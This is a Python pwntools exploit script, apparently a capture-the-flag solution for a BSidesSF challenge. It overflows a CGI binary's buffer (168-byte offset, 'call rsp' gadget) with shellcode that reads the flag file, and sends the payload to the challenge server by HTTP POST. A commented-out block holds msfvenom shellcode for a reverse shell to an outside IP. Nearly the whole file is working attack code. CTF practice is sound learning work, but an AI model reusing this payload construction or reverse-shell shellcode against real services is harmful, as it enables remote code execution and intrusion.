#!/usr/bin/python3
from pwn import *
import requests

# =========================================================
#                          SETUP                         
# =========================================================
exe = './auth.cgi' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h"]

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+265
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    # global io
    # io = initialize()
    offset = 168
    # Generated from msfvenom
    # buf =  b""
    # buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
    # buf += b"\x48\x97\x48\xb9\x02\x00\x05\x39\x12\x88\x76\x2b"
    # buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
    # buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
    # buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
    # buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
    # buf += b"\x0f\x05"
    shellcode = asm(shellcraft.cat("/home/ctf/flag.txt"))
    call_rsp = 0x4127ca
    
    payload = flat(
        b'\x90' * offset,
        call_rsp,
        b'\x90' * 8,
        # buf
        shellcode
    )
    
    response = requests.post("http://cant-give-in-4130d4ca.challenges.bsidessf.net:8080/cgi-bin/auth.cgi", data=payload)
    print(response.text)

    # io.send(payload)
    
    # io.interactive()
    
if __name__ == '__main__':
    exploit()